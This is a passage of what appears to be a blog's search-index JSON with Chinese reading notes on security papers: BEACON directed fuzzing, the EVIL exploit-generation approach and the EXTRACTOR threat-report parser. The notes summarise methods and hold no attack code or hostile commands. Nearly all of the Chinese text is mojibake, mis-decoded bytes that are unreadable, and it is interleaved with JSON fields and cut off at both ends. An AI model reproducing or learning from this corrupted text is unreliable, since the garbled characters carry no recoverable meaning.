åˆ°50æ—¶ï¼Œæ‰§è¡Œè¿‡æ»¤ç‡ä»0.9%ç•¥å¾®æé«˜åˆ°3.2%ã€‚ç„¶è€Œï¼Œæ—¶é—´æˆæœ¬æ€¥å‰§å¢åŠ ï¼Œç”šè‡³è€—å°½äº†æœåŠ¡å™¨å†…å­˜ã€‚å› æ­¤ï¼ŒBEACONä½¿ç”¨5ä½œä¸ºé˜ˆå€¼ï¼Œä»¥è·å¾—æ•ˆç‡å’Œæœ‰æ•ˆæ€§çš„æœ€ä½³ç‚¹ã€‚\næ’æ¡©å¼€é”€ å…¶ä¸­æ˜¾ç¤ºäº†æ¯ä¸ªç¨‹åºçš„æ‰§è¡Œæ¬¡æ•° (Nexec)ã€åŸå§‹æ—¶é—´æˆæœ¬ (Torig)å’Œæ’è£…åçš„æ—¶é—´æˆæœ¬ (TBeacon)ã€‚æˆ‘ä»¬è§‚å¯Ÿåˆ°ï¼ŒBEACONå¼•å…¥äº†é«˜è¾¾9.8%çš„è¿è¡Œæ—¶å¼€é”€ï¼Œå¹³å‡ä¸º5.7%ã€‚æˆ‘ä»¬è®¤ä¸ºè¿™æ ·ä½çš„å¼€é”€åœ¨å®è·µä¸­æ˜¯å¯ä»¥æ¥å—çš„ï¼Œå¹¶ä¸”ä¹‹å‰çš„è¯„ä¼°è¡¨æ˜BEACONæ¯”ç°æœ‰çš„æ¨¡ç³Šå™¨è¦å¿«å¾—å¤šã€‚\nç›¸å…³å·¥ä½œ å®šå‘ç™½ç›’fuzzing Klee[49]ï¼Œä»¥ç”Ÿæˆå¯åˆ©ç”¨çš„è¾“å…¥ï¼Œç”¨äºæ¼æ´å¤ç° ç„¶è€Œï¼Œè·¯å¾„çˆ†ç‚¸é—®é¢˜å’Œä¼—æ‰€å‘¨çŸ¥çš„æ˜‚è´µçº¦æŸæ±‚è§£ä½¿å¾—å®ƒä»¬éš¾ä»¥æ‰©å±•åˆ°ç°å®ä¸–ç•Œçš„ç¨‹åºä¸­ã€‚ ç°æœ‰çš„å·¥ä½œè¯•å›¾åˆ©ç”¨å¯¹æ¼æ´çš„å…ˆéªŒçŸ¥è¯†ï¼Œä½¿ç¬¦å·æ‰§è¡Œä¸“æ³¨äºç›¸å…³çš„ç¨‹åºçŠ¶æ€ã€‚ä¸€ä¸ªæ–¹å‘æ˜¯ä¼˜å…ˆè€ƒè™‘ç¨‹åºè·¯å¾„ï¼Œä»¥ä¾›ç¬¦å·æ‰§è¡Œæ¢ç´¢ã€‚ä¾‹å¦‚ï¼ŒHercules[50]ä½¿ç”¨äº†ä¸€ä¸ªä¸å¥å…¨çš„å‡½æ•°æ‘˜è¦æ¥ç¡®å®šå¯è¾¾è·¯å¾„çš„ä¼˜å…ˆçº§ã€‚å…¶ä»–äººè¦ä¹ˆä¾èµ–bugæŠ¥å‘Š[51]ã€å…³é”®ç³»ç»Ÿè°ƒç”¨[10]ï¼Œè¦ä¹ˆä¾èµ–è¡¥ä¸ä¸­çš„å˜åŒ–[52]æ¥è¯†åˆ«æ½œåœ¨çš„bugè¸ªè¿¹ã€‚ç„¶è€Œï¼Œè¿™äº›å·¥ä½œé€šå¸¸éœ€è¦æ‰‹å·¥ä¸“ä¸šçŸ¥è¯†æ¥ç¡®ä¿è¿™äº›å…ˆéªŒçŸ¥è¯†çš„è´¨é‡ï¼Œè¿™å¯èƒ½å¯¼è‡´ä¸åŒç¨‹åºçš„ä¸åŒè¡¨ç°ã€‚å¦ä¸€ä¸ªæ–¹å‘æ˜¯åŠ é€Ÿç¬¦å·æ‰§è¡Œæœ¬èº«ï¼Œä»¥ä¾¿æ›´å¿«åœ°æ¥è¿‘ç›®æ ‡ã€‚ä¾‹å¦‚ï¼Œç°æœ‰çš„ä½œå“é€šè¿‡å¿«ç…§æœºåˆ¶è±¡å¾æ€§åœ°[53]æˆ–å…·ä½“åœ°[54]ä¿ç•™æ‰§è¡ŒçŠ¶æ€ï¼Œä»¥é¿å…å†—ä½™çš„è·¯å¾„æ¢ç´¢ã€‚Chopper[55]é‡‡ç”¨åœ¨çº¿é™æ€åˆ†ææ¥æä¾›çŠ¶æ€åˆå¹¶ç­–ç•¥ï¼ŒåŒæ—¶æœ€å°åŒ–åŠ¨æ€åˆ†æè·¯å¾„çš„æ•°é‡ã€‚DiSE[56]è¯†åˆ«åˆ†æ”¯æ¡ä»¶ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶é€æ­¥è§£å†³å®ƒä»¬ã€‚ è¦†ç›–å¼•å¯¼fuzzing å¯ä»¥é€šè¿‡åŠ¨æ€æ±¡æŸ“åˆ†ææ¥ä¼˜åŒ–è¾“å…¥ç”Ÿæˆã€‚å…¶åŸºæœ¬æ€æƒ³æ˜¯æ”¹å˜ç›¸å…³çš„è¾“å…¥åç§»é‡ä»¥æ»¡è¶³æœªè¦†ç›–çš„åˆ†æ”¯æ¡ä»¶ã€‚ Angora[57]é‡‡ç”¨å­—èŠ‚çº§æ±¡æŸ“è·Ÿè¸ªæ¥å‘ç°ç›®æ ‡æ¡ä»¶çš„ç›¸å…³è¾“å…¥å­—èŠ‚ï¼Œç„¶ååº”ç”¨åŸºäºæ¢¯åº¦ä¸‹é™çš„æœç´¢ç­–ç•¥ã€‚ ä¸ºäº†ä½¿åŸºäºæ¢¯åº¦ä¸‹é™çš„æœç´¢æ›´åŠ åˆç†ï¼ŒNeuzz[58]æå‡ºä½¿ç”¨ç¥ç»ç½‘ç»œå¹³æ»‘æœç´¢è¿‡ç¨‹ã€‚ è¿˜æœ‰ä¸€äº›æŠ€æœ¯æ¶‰åŠè½»é‡çº§ç¨‹åºåˆ†æå’Œè½¬æ¢ï¼Œä»¥æé«˜çªå˜çš„æœ‰æ•ˆæ€§ã€‚Fairfuzz[59]è¯†åˆ«äº†ä¸éœ€è¦æ”¹å˜å€¼çš„è¾“å…¥åç§»é‡ï¼Œå› æ­¤ï¼Œæœ€å°åŒ–è¾“å…¥æœç´¢ç©ºé—´æé«˜äº†çªå˜çš„æ•ˆç‡ã€‚Mopt[13]æå‡ºäº†ä¸€ç§æ–°çš„çªå˜ç®—å­è°ƒåº¦ç­–ç•¥æ¥è°ƒæ•´ä¸åŒç¨‹åºçš„çªå˜ç­–ç•¥ã€‚ å°†æ¨¡ç³Šå™¨ä¸é›†åˆ/ç¬¦å·æ‰§è¡Œç›¸ç»“åˆï¼Œå³æ··åˆæ¨¡ç³Šï¼Œç”¨äºè§£å†³å¤æ‚å’Œä¸¥æ ¼çš„è·¯å¾„çº¦æŸã€‚ Driller[60]æå‡ºè§£å†³é‚£äº›æœªå‘ç°çš„è·¯å¾„è¿›è¡Œæ¨¡ç³ŠåŒ–ï¼Œè€Œä¸æ˜¯ç”¨é›†åˆæ‰§è¡Œæ¥æ¢ç´¢æ‰€æœ‰è·¯å¾„ã€‚ç„¶è€Œï¼Œå¦‚ä½•æœ‰æ•ˆåœ°å°†ååŒæ‰§è¡Œä¸æ¨¡ç³Šæµ‹è¯•ç›¸ç»“åˆä¸€ç›´æ˜¯äººä»¬å…³æ³¨çš„é—®é¢˜ã€‚ QSYM[61]è§£å†³äº†åŸºç§å­çš„éƒ¨åˆ†è·¯å¾„çº¦æŸï¼Œå¹¶å¯¹æ»¡è¶³å®é™…æ¡ä»¶çš„éªŒè¯è¾“å…¥åˆ©ç”¨äº†çªå˜ã€‚ Intriguer[62]è¿›ä¸€æ­¥ç”¨åŠ¨æ€æ±¡æŸ“åˆ†æå–ä»£ç¬¦å·ä»¿çœŸï¼Œè¿™å‡å°‘äº†å»ºæ¨¡å¤§é‡ç±»ç§»åŠ¨æŒ‡ä»¤çš„å¼€é”€ã€‚ Pangolin[63]å»ºè®®å°†çº¦æŸä¿ç•™ä¸ºæŠ½è±¡ï¼Œå¹¶é‡ç”¨å®ƒæ¥æŒ‡å¯¼è¿›ä¸€æ­¥çš„è¾“å…¥ç”Ÿæˆã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/beacon-directed-grey-box-fuzzing-with-provable-path-pruning/","summary":"ä¸­æ–‡è¯‘åï¼šä¿¡æ ‡: å…·æœ‰å¯è¯æ˜è·¯å¾„å‰ªæçš„å®šå‘ç°ç›’æ¨¡ç³Šæµ‹è¯• ä½œè€…ï¼šHuang Heqing å•ä½ï¼šé¦™æ¸¯ç§‘æŠ€å¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2022å¹´ æ¥æºï¼š #SP å…³é”®å­—ï¼š #å®šå‘","title":"BEACON Directed Grey-Box Fuzzing with Provable Path Pruning"},{"content":"ä¸­æ–‡è¯‘åï¼ševil: åˆ©ç”¨è‡ªç„¶è¯­è¨€å¼€å‘è½¯ä»¶ ä½œè€…ï¼šPietro Liguori å•ä½ï¼šé‚£ä¸å‹’æ–¯è´¹å¾·ç‘ç§‘äºŒä¸–å¤§å­¦ å›½å®¶ï¼š #æ„å¤§åˆ© å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ISSRE_CCFB å…³é”®å­—ï¼š #NLP_AGE ä»£ç åœ°å€ï¼šdessertlab/EVIL: EVIL (Exploiting software VIa natural Language) is an approach to automatically generate software exploits in assembly/Python language from descriptions in natural language. The approach leverages Neural Machine Translation (NMT) techniques and a dataset that we developed for this work. (github.com) ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-05-15 22:29 è¿™ç¯‡è®ºæ–‡å¹¸å¥½æ˜¯21å¹´ï¼Œè¦æ˜¯ä»Šå¹´å‘å°±æƒ¨äº†\nABSTRACT EVIL can automatically generate exploits in assembly/python language from descriptions in natural language. EVIL leverages Neural Machine Translation techniques and a dataset that author developed. METHODLOGY pre-processing tokenization standardization: prevent non-English tokens from getting transformed during learning process intent parser: input natural language (intent), output a dictionary of standardizable tokens such as specific values, label names, and parameters Standardizer: input is the output of the intent parser and replace the selected token in both intent adn snippet. just like the step 3 and 4 in figure 1 embedding NMT models Seq2Seq bi-directional LSTM as the encoder CodeBERT Post-Processing it is a inverse operation of standardization, it replaces the symbolic value with the real value è™½ç„¶èƒ½æŠŠè‡ªç„¶è¯­è¨€è½¬æ¢æˆä»£ç ï¼Œä½†æ˜¯éœ€è¦çš„è‡ªç„¶è¯­è¨€çš„æè¿°åŠå…¶è¯¦ç»†\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/evil-exploiting-software-via-natural-language/","summary":"ä¸­æ–‡è¯‘åï¼ševil: åˆ©ç”¨è‡ªç„¶è¯­è¨€å¼€å‘è½¯ä»¶ ä½œè€…ï¼šPietro Liguori å•ä½ï¼šé‚£ä¸å‹’æ–¯è´¹å¾·ç‘ç§‘äºŒä¸–å¤§å­¦ å›½å®¶ï¼š #æ„å¤§åˆ© å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ISSRE_CCFB å…³é”®å­—ï¼š #NLP_AGE","title":"EVIL Exploiting Software via Natural Language"},{"content":"ä¸­æ–‡è¯‘åï¼šæå–å™¨: ä»å¨èƒæŠ¥è¡¨ä¸­æå–æ”»å‡»è¡Œä¸º ä½œè€…ï¼šKiavash Satvat å•ä½ï¼šä¼Šåˆ©è¯ºä¼Šå¤§å­¦èŠåŠ å“¥åˆ†æ ¡ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #SP å…³é”®å­—ï¼š #æå–ä¿¡æ¯ ä»£ç åœ°å€ï¼š https://github.com/ksatvat/Extractor ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-04-13 17:43\næ‘˜è¦ æå‡º EXTRACTORï¼Œå¯ä»¥ä» CTI æŠ¥å‘Šï¼ˆCyber Threat Intelligence reportsï¼‰ä¸­ç²¾ç¡®æå–ç®€æ´çš„æ”»å‡»è¡Œä¸º å¯ä»¥æå–éç»“æ„åŒ–æ–‡æœ¬ï¼Œå¯¹æ–‡æœ¬æ²¡æœ‰è¦æ±‚ 1. Introduction æŒ‘æˆ˜ å†—é•¿ï¼šå¨èƒæŠ¥å‘Šä¸­å……æ–¥ç€å¤§é‡æ— å…³æ–‡æœ¬ã€‚ CTI æŠ¥å‘Šçš„å¥æ³•å’Œè¯­ä¹‰å¤æ‚æ€§ã€æŠ€æœ¯æœ¯è¯­çš„æ™®éä½¿ç”¨ä»¥åŠç¼ºä¹é€‚å½“çš„æ ‡ç‚¹ç¬¦å·å¾ˆå®¹æ˜“å½±å“æŠ¥å‘Šçš„è§£é‡Šå’Œæ”»å‡»è¡Œä¸ºçš„æå–ã€‚ éš¾ä»¥å‡†ç¡®åœ°è§£é‡ŠæŠ€æœ¯æŠ¥å‘Šä¸­çš„å¤æ‚é€»è¾‘ã€‚ ç›®æ ‡ é™¤äº†è§£å†³ä¸Šé¢çš„æŒ‘æˆ˜ï¼Œä½œè€…è¿˜æƒ³å®ç°ä¸¤ä¸ªç›®æ ‡ï¼š\nå¯æ“ä½œçš„æƒ…æŠ¥ï¼šEXTRACTOR ä»æ–‡æœ¬ä¸­æå–çš„æ”»å‡»è¡Œä¸ºå¿…é¡»èƒ½åœ¨ç³»ç»Ÿå®¡è®¡æ—¥å¿—ä¸­è¢«è§‚å¯Ÿåˆ°ï¼Œå¹¶èƒ½æœ‰æ•ˆåœ°ç”¨äºå¨èƒæ£€æµ‹ã€‚ä¸éœ€è¦äººå‘˜æˆ–å·¥å…·çš„è¿›ä¸€æ­¥å¤„ç† å‡†ç¡®å¤„ç†å¤§é‡ CTI æŠ¥å‘Šã€‚ è‡ªåŠ¨æŒ–æ˜æ›´å¤§çš„çŸ¥è¯†æºï¼ˆèƒ½å¤Ÿå¤„ç†ä¸åŒçš„æ–‡æœ¬ï¼‰ ä» CTI æŠ¥å‘Šä¸­æ„å»ºå›¾è¡¨è¡¨ç¤º ä»ä¸ä¸åŒç»„ç»‡ä¸­çš„åŒä¸€æ”»å‡»ç›¸å…³çš„å„ç§ CTI æºæå–ä¿¡æ¯ 2. é—®é¢˜å’ŒèƒŒæ™¯ é—®é¢˜æè¿° ï¼ˆå®ç°æ•ˆæœï¼‰ æŠ¥å‘Š (å·¦å›¾)æ˜¯ njRATçš„è‡ªç”±æ”¹ç¼–ï¼Œåˆ é™¤äº†ä¸ç›¸å…³çš„å¥å­ã€‚è¿™ä¸ªä¾‹å­å±•ç¤ºäº†è¯­è¨€çš„å¤æ‚æ€§ï¼Œè¿™å°†åœ¨æœ¬æ–‡ä¸­è®¨è®ºã€‚åœ¨ç›¸åº”çš„æ¥æºå›¾ä¸­ (å³ä¾§)ï¼ŒèŠ‚ç‚¹è¡¨ç¤ºç³»ç»Ÿå®ä½“ï¼Œè¾¹æŒ‡å‘ç³»ç»Ÿè°ƒç”¨ã€‚çŸ©å½¢ã€æ¤­åœ†å½¢ã€äº”è¾¹å½¢å’Œè±å½¢åˆ†åˆ«è¡¨ç¤ºæ–‡ä»¶ã€è¿›ç¨‹ã€æ³¨å†Œè¡¨å’Œå¥—æ¥å­—ã€‚\næŒ‘æˆ˜ å†—ä½™ CTI æ–‡æœ¬çš„å¤æ‚æ€§ ç¼ºå°‘æ ‡ç‚¹ç¬¦å·â€”â€”NLP å·¥å…·éš¾ä»¥åˆ†è¾¨å¥å­è¾¹ç•Œ ä¸“ä¸šå•è¯â€”â€”NLP å·¥å…·æ˜¯ç”¨é€šç”¨è‹±è¯­æ¥è®­ç»ƒçš„ã€‚ çœç•¥ï¼šCTI æŠ¥å‘Šä¸­ç»å¸¸å‡ºç°ç¼ºå°‘ä¸»è¯­æˆ–å®¾è¯­çš„æƒ…å†µ ä¸èƒ½å¿½ç•¥ä»£è¯ã€‚ å¤æ‚çš„è¯­è¨€ç»“æ„ï¼šç»“æ„çš„å¤æ‚æ€§å’Œå„ç§è¯­è¨€æŠ€æœ¯ (å¦‚å›æŒ‡ã€åè¯åŒ–å’Œåˆ—è¡¨)çš„ä½¿ç”¨å¯èƒ½ä¼šæ··æ·†å¸¸è§çš„ NLP å·¥å…·ã€‚æ€»çš„å½±å“æ˜¯ï¼Œè®¸å¤šä¸»è¯­ã€åŠ¨è¯å’Œå®¾è¯­è¢«é”™è¯¯åœ°åˆ†ç±»å¹¶æ— æ³•è§£å†³ã€‚ å…³ç³»çš„æå–ï¼šä¸èƒ½ä»…ä»…ä¾èµ–å¥å­çš„è¯­æ³•ç»“æ„ï¼Œè¿˜è¦åˆ†æè¯­ä¹‰ 3. APPROACH EXTRACTOR æœ‰å››ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†:1)å½’ä¸€åŒ–ï¼Œ2)resolutionï¼Œ3)æ‘˜è¦ï¼Œ4)å›¾ç”Ÿæˆã€‚\nè§„èŒƒåŒ–è´Ÿè´£ç¬¬ä¸€è½®çš„å¥å­ç®€åŒ–å’Œè½¬æ¢åˆ°æ ‡å‡†å½¢å¼ã€‚ Resolution è§£å†³äº†è¿™äº›å¥å­ä¸­çš„æ­§ä¹‰ æ‘˜è¦åˆ é™¤äº†ä¸æ”»å‡»è¡Œä¸ºä¸ä¸¥æ ¼ç›¸å…³çš„éƒ¨åˆ†æ–‡æœ¬ã€‚ æœ€åï¼Œå›¾ç”Ÿæˆè´Ÿè´£è§£å†³æ–‡æœ¬ä¸­äº‹ä»¶ä¹‹é—´çš„æ—¶é—´å’Œå› æœé¡ºåºï¼Œå¹¶æ„å»ºæœ€ç»ˆçš„èµ·æºå›¾ ã€‚ å®ä¾‹ï¼š A.å½’ä¸€åŒ– ç›®çš„ï¼šç”Ÿæˆè§„èŒƒçš„å¥å­å½¢å¼â€”â€”å°†é•¿è€Œå¤æ‚çš„å¥å­åˆ†è§£æˆæ›´çŸ­çš„å¥å­ï¼Œä»¥è§„èŒƒçš„å½¢å¼å‡ºç°ã€‚ç›´è§‚çš„è¯´ï¼Œæ¯ä¸ªå¥å­éƒ½è¡¨è¾¾ä¸€ä¸ªå•ç‹¬çš„åŠ¨ä½œï¼Œè¿™æ ·åŠ¨ä½œçš„ä¸»ä½“å’Œå¯¹è±¡ä»¥åŠåŠ¨ä½œæœ¬èº«å°±æ›´å®¹æ˜“è¯†åˆ«ã€‚ æ“ä½œï¼šè§„èŒƒåŒ–ç”± Tokenizationã€Homogenization å’Œ Conversion.ç»„æˆã€‚è¿™äº›æ­¥éª¤åˆ†åˆ«æ‰§è¡Œå¥å­è¾¹ç•Œæ£€æµ‹ã€å•è¯åŒè´¨åŒ–å’Œè¢«åŠ¨åˆ°ä¸»åŠ¨åŠ¨è¯è½¬æ¢ã€‚\nTokenization ç›®çš„ï¼šåˆ’åˆ†å¥å­\nä½¿ç”¨æ ‡ç‚¹ç¬¦å·ã€æ–°è¡Œã€é¡¹ç›®ç¬¦å·ã€æšä¸¾æ•°å­—ä»¥åŠæ ‡é¢˜å’Œé¢˜ç›®ä½œä¸ºå¥å­åˆ†éš”ç¬¦ï¼Œå°†é•¿å¥å­åˆ†å‰²ä¸ºå•è¯åºåˆ— å¦‚æœæ¯ä¸ªçŸ­åºåˆ—æ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼Œå°±å‡çº§ä¸ºä¸€ä¸ªé•¿å¥å­ ä»¥å¤§å†™çš„ä¸»è¯­å¼€å§‹ï¼ŒåŒ…å«äº†æ„æˆä¸€ä¸ªå®Œæ•´å¥å­æ‰€å¿…é¡»çš„æ‰€æœ‰æˆåˆ†ï¼Œå¹¶ä¸”å‰ååºåˆ—ä¹Ÿæ˜¯å®Œæ•´å¥å­ ä»¥ä¸€ä¸ªåŠ¨è¯å¼€å§‹ï¼Œå¹¶ä¸”è¯¥åŠ¨è¯åŒ…å«åœ¨ç³»ç»Ÿè°ƒç”¨å­—å…¸ä¸­ï¼Œåºåˆ—åŒ…å«äº†æ„æˆä¸€ä¸ªå®Œæ•´å¥å­æ‰€å¿…é¡»çš„æ‰€æœ‰æˆåˆ†ï¼Œå¹¶ä¸”å‰ååºåˆ—ä¹Ÿæ˜¯å®Œæ•´å¥å­ ç¤ºä¾‹ï¼ˆå›¾ 4ï¼‰ï¼š 4-9 æ˜¯ä¸€ä¸ªé•¿å¥å­, é¦–å…ˆè¢«åˆ’åˆ†ä¸ºæ›´çŸ­çš„åºåˆ—ï¼Œç„¶åç”¨ POS å’Œ DP ä¸ºå…¶æ ‡è®°ã€‚å¹¶æ£€æŸ¥æ˜¯å¦æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶ã€‚ ç¬¬4è¡Œåºåˆ—æ»¡è¶³ç¬¬ä¸€ç§æƒ…å†µçš„æ¡ä»¶ï¼Œè€Œç¬¬5-9è¡Œåºåˆ—æ»¡è¶³ç¬¬äºŒç§æƒ…å†µ (çœç•¥ä¸»è¯­)çš„æ¡ä»¶ã€‚ Homogenization ç›®çš„ï¼šå°†åŒä¸€æ¦‚å¿µçš„å¤šä¸ªæ–‡æœ¬è¡¨ç¤ºæ›¿æ¢ä¸ºåŒä¸€æ–‡æœ¬è¡¨ç¤ºçš„è¿‡ç¨‹ã€‚\nCTI æŠ¥å‘Šé€šå¸¸åŒ…å«å¯èƒ½å¼•å…¥æ­§ä¹‰å¹¶å½±å“æœ€ç»ˆç»“æœè´¨é‡çš„ç»“æ„å’ŒåŒä¹‰è¯ã€‚ä¾‹å¦‚ï¼ŒC 2ã€C\u0026amp;C å’Œ Command and Control æ˜¯åŒä¸€ä¸ªå®ä½“çš„ä¸åŒè¡¨ç¤ºï¼Œè€Œåƒ storesã€save è¿™æ ·çš„åŠ¨è¯å¯èƒ½è¡¨ç¤ºå¯¹åº”äºå†™å…¥ç³»ç»Ÿè°ƒç”¨çš„æ“ä½œã€‚ æ“ä½œï¼š\nä½¿ç”¨ä¸¤ä¸ªä¸“é—¨æ„å»ºçš„å­—å…¸å¯¹åè¯çŸ­è¯­å’ŒåŠ¨è¯è¿›è¡Œ Homogenizationï¼Œå°† CTI æŠ¥å‘Šä¸­å‡ºç°çš„ä¸åŒæœ¯è¯­çš„åŒä¹‰è¯æ˜ å°„åˆ°å®¡è®¡æ—¥å¿—ä¸­å¯ä»¥è§‚å¯Ÿåˆ°çš„å®ä½“æˆ–æ“ä½œã€‚ Coversion ç›®çš„ï¼šEXTRACTOR å°†è¢«åŠ¨è¯­æ€è½¬æ¢ä¸ºä¸»åŠ¨è¯­æ€ã€‚è¿™ç§è½¬æ¢æœ‰åŠ©äºå‘ç°ç³»ç»Ÿä¸»ä½“ (è¿‡ç¨‹)å’Œç³»ç»Ÿå¯¹è±¡ï¼Œä»¥åŠä½¿å› æœå…³ç³»æ¨æ–­æ›´å‡†ç¡®. æ“ä½œï¼š\nä½¿ç”¨ POS å’Œ DP æ¥æ£€æµ‹è¢«åŠ¨å¥ ç„¶åè½¬æ¢ä¸»è¯­å’Œå®æ–½è€…ï¼Œå¹¶å°†è¢«åŠ¨åŠ¨è¯è½¬æ¢ä¸ºä¸»åŠ¨åŠ¨è¯ã€‚ ç»è¿‡å½’ä¸€åŒ–çš„ä¸‰éƒ¨åˆ†åï¼Œé•¿å¥è¢«è½¬æ¢ä¸ºçŸ­å¥ï¼Œå¹¶ä¸”æ¯ä¸ªçŸ­å¥éƒ½ä»¥ä¸»åŠ¨çš„å½¢å¼æ¥è¡¨è¾¾ä¸€ä¸ªåŠ¨ä½œã€‚\nResolution è¿™éƒ¨åˆ†ä¸»è¦ç”¨äºè§£å†³å¥å­çš„æ­§ä¹‰ï¼Œä½œè€…åŸè¯æ˜¯â€œResolution å°†å¼•ç”¨åŒä¸€å®ä½“çš„éšå¼å¼•ç”¨ä¸å®é™…å¼•ç”¨è¿›è¡Œåè°ƒâ€ï¼Œæˆ‘çš„ç†è§£æ˜¯éšå¼å¼•ç”¨å¯èƒ½å­˜åœ¨ä¸€äº›çœç•¥çš„ä¸»è¯­å¯¼è‡´å¥å­äº§ç”Ÿæ­§ä¹‰ï¼Œé‚£ Resolution å°±éœ€è¦å¯¹ä¸»è¯­è¿›è¡Œè¡¥å……ï¼Œå°†éšå¼å¼•ç”¨è½¬æ¢ä¸ºæ˜¾å¼å¼•ç”¨ã€‚\nEllipsis Subjectï¼ˆçœç•¥ä¸»è¯­ï¼‰ Resolution (ESR) å›¾å››ç¤ºä¾‹ä¸­çš„ç¬¬ 5-9 éƒ½æ˜¯çœç•¥ä¸»è¯­ ç›®çš„ï¼šæ‰¾åˆ°å¹¶è¡¥å……ä¸»è¯­ æ“ä½œï¼š\nåˆ©ç”¨ POS å’Œ DP æ‰¾åˆ°ç¼ºå°‘ä¸»è¯­çš„å¥å­ ä½¿ç”¨å½“å‰å¥å­ä¹‹å‰çš„å¥å­ä¸­å‡ºç°çš„å®ä½“æ„å»ºä¸€ä¸ªå€™é€‰ä¸»è¯­åˆ—è¡¨ è®¡ç®—å€™é€‰ä¸»è¯­å’Œç¼ºå°‘ä¸»è¯­çš„å¥å­ä¹‹é—´çš„è·ç¦»ï¼ˆä»¥å¥å­æ•°è®¡ç®—ï¼‰ï¼Œè·ç¦»è¶Šè¿‘è¢«é€‰ä¸­çš„æ¦‚ç‡è¶Šé«˜ã€‚ ç¤ºä¾‹ï¼š å›¾å››çš„5-9è¡Œå¥å­ä¸­ç¼ºå°‘ä¸»è¯­ã€‚ESR æ¨¡å—æ£€æµ‹å‰é¢å¥å­ä¸­çš„ä¸»è¯­å’Œå…¶ä»–å®¾è¯­ï¼Œå¹¶é€‰æ‹©å‡ºç°åœ¨å†’å·å‰é¢çš„ä»£è¯ä½œä¸ºä¸»è¯­ã€‚\nPronounï¼ˆä»£è¯ï¼‰ Resolution (PR) ç›®çš„ï¼šä»£è¯è§£ææ˜¯å°†ä»£è¯æ˜ å°„å¹¶æ›¿æ¢åˆ°å…¶æ‰€æŒ‡çš„å…ˆè¡Œè¯å®ä½“çš„è¿‡ç¨‹ã€‚ æ“ä½œï¼š\né‡‡ç”¨äº†ä¸€ä¸ªæµè¡Œçš„å…±æŒ‡è§£ææ¨¡å‹ NeuralCorefã€‚è¿™ä¸ªæ¨¡å‹åœ¨è§£æ CTI æŠ¥è¡¨åŸŸä¸­çš„ä»£è¯æ—¶æ•ˆæœæœ€å¥½ï¼Œç‰¹åˆ«æ˜¯åœ¨å‰é¢çš„ ESR å’Œ Tokenization æ­¥éª¤ä¹‹åã€‚å›¾4ï¼Œç¬¬4ã€5å’Œ6è¡Œæ¼”ç¤ºäº†å·²è§£æçš„å‰åè¯ (å³ it å’Œæœ¬èº«)åŠå…¶å¯¹åº”çš„å¼•ç”¨ (autoalization .exe)ã€‚ Entity Resolution (ER). å®ä½“è§£ææ˜¯æŒ‡åœ¨åŒä¸€å¥ä¸­æŒ‡ä»£å¦ä¸€ä¸ªå®ä½“çš„åè¯æˆ–åŠ¨è¯çŸ­è¯­è¢«è¯¥å®ä½“æ›¿æ¢æˆ–ä½œä¸ºå†—ä½™åˆ é™¤çš„è¿‡ç¨‹ã€‚ ï¼ˆè¿™éƒ¨åˆ†å’Œä»£è¯æœ‰ç‚¹åƒï¼Œä¾‹å¦‚ï¼Œåœ¨å›¾4çš„ç¬¬11è¡Œä¸­ï¼ŒThe following files æŒ‡çš„æ˜¯ mscno. exe authorization. EXE-0AD199D6. pfã€‚è¿™éƒ¨åˆ†å°±æ˜¯è¦æŠŠ The following files æ¢æˆå…·ä½“çš„å®ä½“åï¼‰ è¿™ç±»è¯ä¸»è¦æœ‰ä¸‰ç±»ï¼šAnaphoraï¼ˆæŒ‡ä»£ï¼‰ï¼ŒNominalizationï¼ˆåè¯åŒ–ï¼‰ï¼Œauxiliary verbï¼ˆåŠ©åŠ¨è¯ï¼‰\nåœ¨ Resolution æ¨¡å—è¿‡åï¼Œæ­¤æ—¶çš„æ–‡æœ¬ç”±å…·æœ‰æ˜ç¡®ä¸»è¯­ã€å®¾è¯­å’ŒåŠ¨è¯çš„å¥å­ç»„æˆã€‚\ntext summarization ç›®çš„ï¼šå¯¹å®¡è®¡æŠ¥å‘Šä¸­æ²¡æœ‰å‡ºç°çš„å†…å®¹è¿›è¡Œåˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä½œè€…å¸Œæœ›èƒ½å¤Ÿå¯¹æ–‡æœ¬æ›´è¿‘ä¸€æ­¥çš„è¿›è¡Œå¤„ç†ï¼Œä¸æ˜¯ç®€å•çš„å‰”é™¤éæŠ€æœ¯å†…å®¹ã€‚ æ“ä½œï¼š\nä½¿ç”¨ bert æ¨¡å‹å°†å¥å­åˆ†ä¸ºç”Ÿäº§æ€§å’Œéç”Ÿäº§æ€§ ä½¿ç”¨ BiLSTM æ¨å¯¼ç”Ÿäº§æ€§å¥å­ç»„ä»¶çš„è¯­ä¹‰è§’è‰²ï¼Œå¹¶åˆ é™¤ä¸å¿…è¦çš„å•è¯ ä¸ºäº†é¿å…åˆ é™¤å¯èƒ½åŒ…å«é‡è¦å¯¹è±¡çš„å¥å­ç»„ä»¶ï¼Œä½¿å¾—åˆ é™¤æ›´åŠ ç²¾ç¡®ï¼Œä½¿ç”¨ç³»ç»Ÿå®ä½“æå–å™¨â€”â€”å¦‚æœä¸€ä¸ªè¢«æ ‡è®°ä¸ºéœ€è¦åˆ é™¤çš„å¥å­ç»„æˆéƒ¨åˆ†ä¸åŒ…å« SEE ç»„ä»¶è§„åˆ™å¯ä»¥ç”Ÿæˆçš„ä»»ä½•å®ä½“ï¼Œåˆ™è¯¥ç»„æˆéƒ¨åˆ†å°†è¢«åˆ é™¤ã€‚ text summarization æ˜¯ EXTRACTOR çš„æ 